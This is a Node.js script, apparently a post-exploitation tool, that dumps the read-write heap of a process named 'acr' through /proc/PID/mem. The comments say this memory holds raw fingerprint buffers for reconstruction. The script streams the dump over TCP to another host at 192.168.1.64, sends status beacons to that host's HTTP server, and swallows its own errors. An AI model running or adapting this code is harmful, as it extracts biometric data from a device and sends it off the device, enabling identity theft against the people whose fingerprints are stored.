"use strict";
// audit126.js - stream the acr heap dump (/tmp/acr_mem.bin) to the PC over TCP.
// Contains the raw fingerprint buffers for reconstruction. node 4.4-safe.
var fs = require("fs");
var net = require("net");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var TCPPORT = 19998;
var HTTPPORT = 9999;

function post(path, body) {
    try {
        var data = JSON.stringify(body);
        var req = http.request({ host: HOST, port: HTTPPORT, path: path, method: "POST",
            headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
            function (res) { try { res.resume(); } catch (e) {} });
        req.on("error", function () {});
        req.write(data); req.end();
    } catch (e) {}
}
function sh(cmd, cap, to) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: to || 30000 }).slice(0, cap || 2000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = { started: new Date().toISOString() };
out.id = sh("id | head -c 60", 80);

// dump rw heap
out.dump = sh("cat /proc/$(pidof acr | awk '{print $1}')/maps | awk '$2 ~ /^rw/ {split($1,a,\"-\"); print a[1], a[2]}' > /tmp/.amap; " +
    "> /tmp/acr_mem.bin; while read s e; do ss=$(printf '%d' 0x$s); es=$(printf '%d' 0x$e); sz=$((es-ss)); " +
    "dd if=/proc/$(pidof acr | awk '{print $1}')/mem bs=4096 skip=$((ss/4096)) count=$(((sz+4095)/4096)) 2>/dev/null | head -c $sz >> /tmp/acr_mem.bin; " +
    "done < /tmp/.amap; wc -c /tmp/acr_mem.bin", 200, 40000);
post("/p126_dump", out);

// stream the file to PC over TCP
var buf;
try {
    buf = fs.readFileSync("/tmp/acr_mem.bin");
} catch (e) {
    // fallback: pull via dd in one shot
    buf = cp.execSync("dd if=/tmp/acr_mem.bin 2>/dev/null", { timeout: 60000, maxBuffer: 40 * 1024 * 1024 });
}
post("/p126_read", { bytes: buf.length });

var sock = net.connect(TCPPORT, HOST);
sock.on("connect", function () {
    // length-prefixed so the receiver knows the size
    var hdr = Buffer(8);
    hdr.writeUInt32LE(buf.length, 0);
    hdr.writeUInt32LE(0, 4);
    sock.write(hdr);
    sock.write(buf, function () {
        sock.end();
        post("/p126_done", { sent: buf.length, status: "streamed" });
    });
});
sock.on("error", function (e) {
    post("/p126_done", { sent: buf ? buf.length : 0, status: "tcp_error", err: String(e && e.message) });
});
sock.on("close", function () {
    post("/p126_close", { ok: true });
});
console.log("audit126 streaming " + (buf ? buf.length : "?") + " bytes");
